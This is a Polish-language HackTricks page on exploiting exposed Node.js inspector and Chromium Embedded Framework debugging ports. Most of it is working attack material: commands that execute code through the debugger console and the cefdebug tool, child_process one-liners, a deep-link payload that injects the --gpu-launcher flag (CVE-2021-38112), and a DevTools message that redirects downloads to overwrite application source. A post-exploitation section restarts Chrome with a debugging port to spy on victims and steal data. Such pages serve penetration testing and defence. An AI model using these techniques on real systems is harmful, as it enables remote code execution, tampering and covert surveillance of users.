# Nadużycie debugera Node inspector/CEF

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

[Z dokumentacji](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Gdy uruchomiony jest z przełącznikiem `--inspect`, proces Node.js nasłuchuje na klienta debugującego. **Domyślnie** będzie nasłuchiwał na hoście i porcie **`127.0.0.1:9229`**. Każdy proces otrzymuje również **unikalne** **UUID**.

Klienci inspektora muszą znać i określić adres hosta, port oraz UUID, aby się połączyć. Pełny adres URL będzie wyglądał mniej więcej tak: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Ponieważ **debuger ma pełny dostęp do środowiska wykonawczego Node.js**, złośliwy aktor zdolny do połączenia się z tym portem może wykonać dowolny kod w imieniu procesu Node.js (**potencjalna eskalacja uprawnień**).
{% endhint %}

Istnieje kilka sposobów uruchomienia inspektora:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Kiedy uruchomisz proces poddany inspekcji, pojawi się coś w tym stylu:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesy oparte na **CEF** (**Chromium Embedded Framework**) muszą używać parametru: `--remote-debugging-port=9222` aby otworzyć **debugger** (zabezpieczenia SSRF pozostają bardzo podobne). Jednakże zamiast udzielać sesji **debugowania** **NodeJS**, będą komunikować się z przeglądarką za pomocą [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), jest to interfejs do kontrolowania przeglądarki, ale nie ma bezpośredniego RCE.

Gdy uruchomisz przeglądarkę w trybie debugowania, pojawi się coś w rodzaju:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Przeglądarki, WebSockets i polityka tego samego pochodzenia <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Strony internetowe otwarte w przeglądarce internetowej mogą wykonywać żądania WebSocket i HTTP zgodnie z modelem bezpieczeństwa przeglądarki. **Początkowe połączenie HTTP** jest konieczne do **uzyskania unikalnego identyfikatora sesji debugera**. **Polityka tego samego pochodzenia** **zapobiega** stronom internetowym możliwości **nawiązania tego połączenia HTTP**. Dla dodatkowego zabezpieczenia przed [**atakami DNS rebinding**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js weryfikuje, że nagłówki **'Host'** dla połączenia precyzyjnie określają **adres IP** lub **`localhost`** lub **`localhost6`**.

{% hint style="info" %}
Te **środki bezpieczeństwa zapobiegają wykorzystaniu inspektora** do uruchamiania kodu poprzez **wysłanie zwykłego żądania HTTP** (co mogłoby zostać zrobione poprzez wykorzystanie podatności SSRF).
{% endhint %}

### Uruchamianie inspektora w działających procesach

Możesz wysłać **sygnał SIGUSR1** do działającego procesu nodejs, aby **uruchomić inspektora** na domyślnym porcie. Należy jednak pamiętać, że wymagane są odpowiednie uprawnienia, co może dać dostęp do informacji wewnątrz procesu, ale nie spowoduje bezpośredniego eskalowania uprawnień.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
To jest przydatne w kontenerach, ponieważ **zatrzymanie procesu i uruchomienie nowego** z `--inspect` nie jest opcją, ponieważ **kontener** zostanie **zabity** wraz z procesem.
{% endhint %}

### Połączenie z inspektorem/debugerem

Aby połączyć się z przeglądarką opartą na **Chromium**, można uzyskać dostęp do adresów URL `chrome://inspect` lub `edge://inspect` dla przeglądarek Chrome lub Edge, odpowiednio. Klikając przycisk Konfiguruj, należy upewnić się, że **docelowy host i port** są poprawnie wymienione. Na obrazku przedstawiono przykład zdalnego wykonania kodu (RCE):

![](<../../.gitbook/assets/image (671).png>)

Za pomocą **wiersza poleceń** można połączyć się z debugerem/inspektorem za pomocą:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Narzędzie [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) pozwala **znaleźć inspektory** działające lokalnie i **wstrzyknąć kod** do nich.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Należy pamiętać, że **eksploity RCE NodeJS nie zadziałają**, jeśli połączysz się z przeglądarką za pomocą [**protokołu Chrome DevTools**](https://chromedevtools.github.io/devtools-protocol/) (należy sprawdzić interfejs API, aby znaleźć interesujące rzeczy do zrobienia z nim).
{% endhint %}

## RCE w NodeJS Debugger/Inspector

{% hint style="info" %}
Jeśli tu trafiłeś, szukając jak uzyskać **RCE z XSS w Electron, sprawdź tę stronę.**
{% endhint %}

Niektóre powszechne sposoby uzyskania **RCE**, gdy możesz **połączyć** się z **inspektorem Node**, to korzystanie z czegoś takiego (wygląda na to, że to **nie zadziała w połączeniu z protokołem Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Dane wejściowe protokołu Chrome DevTools

Możesz sprawdzić API tutaj: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
W tej sekcji wymienię interesujące rzeczy, które ludzie wykorzystali do atakowania tego protokołu.

### Wstrzykiwanie parametrów poprzez głębokie linki

W [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security odkryło, że aplikacja oparta na CEF **zarejestrowała niestandardowy adres URI** w systemie (workspaces://), który otrzymywał pełny adres URI, a następnie **uruchamiał aplikację opartą na CEF** z konfiguracją częściowo tworzoną z tego adresu URI.

Odkryto, że parametry URI były dekodowane z adresu URL i używane do uruchamiania podstawowej aplikacji CEF, umożliwiając użytkownikowi **wstrzyknięcie** flagi **`--gpu-launcher`** w **wierszu poleceń** i wykonanie dowolnych działań.

Więc, taki ładunek jak:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### Nadpisz pliki

Zmień folder, w którym **zapisywane są pobrane pliki**, i pobierz plik, aby **nadpisać** często używany **kod źródłowy** aplikacji swoim **złośliwym kodem**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Wykorzystanie zdalnego wykonania kodu (RCE) i eksfiltracja

Zgodnie z tym postem: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) istnieje możliwość uzyskania RCE i eksfiltracji wewnętrznych stron z theriver.

### Po eksploatacji

W rzeczywistym środowisku i **po skompromitowaniu** komputera użytkownika korzystającego z przeglądarki opartej na Chrome/Chromium, można uruchomić proces Chrome z **aktywowanym debugowaniem i przekierować port debugowania**, aby uzyskać do niego dostęp. W ten sposób będzie można **sprawdzić wszystko, co ofiara robi z Chrome i ukraść wrażliwe informacje**.

Sposobem na zachowanie dyskrecji jest **zakończenie każdego procesu Chrome** i następnie wywołanie czegoś w stylu
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Odnośniki

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
